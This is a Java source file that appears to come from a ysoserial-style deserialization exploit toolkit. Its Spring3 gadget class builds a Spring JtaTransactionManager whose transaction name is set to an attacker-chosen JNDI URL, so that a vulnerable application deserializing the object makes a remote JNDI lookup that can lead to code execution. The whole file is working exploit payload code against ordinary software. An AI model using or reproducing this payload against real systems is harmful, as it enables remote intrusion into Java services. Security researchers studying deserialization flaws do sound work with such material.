package A.R.ysogate.payloads.gadgets;

import org.springframework.transaction.jta.JtaTransactionManager;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Dependencies;

@Dependencies({"org.springframework:spring-tx:5.2.3.RELEASE", "org.springframework:spring-context:5.2.3.RELEASE", "javax.transaction:javax.transaction-api:1.2"})
public class Spring3 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		String jndiURL = null;
		if (command.toLowerCase().startsWith("jndi:")) {
			jndiURL = command.substring(5);
		}

		JtaTransactionManager manager = new JtaTransactionManager();
		manager.setUserTransactionName(jndiURL);
		return manager;
	}
}
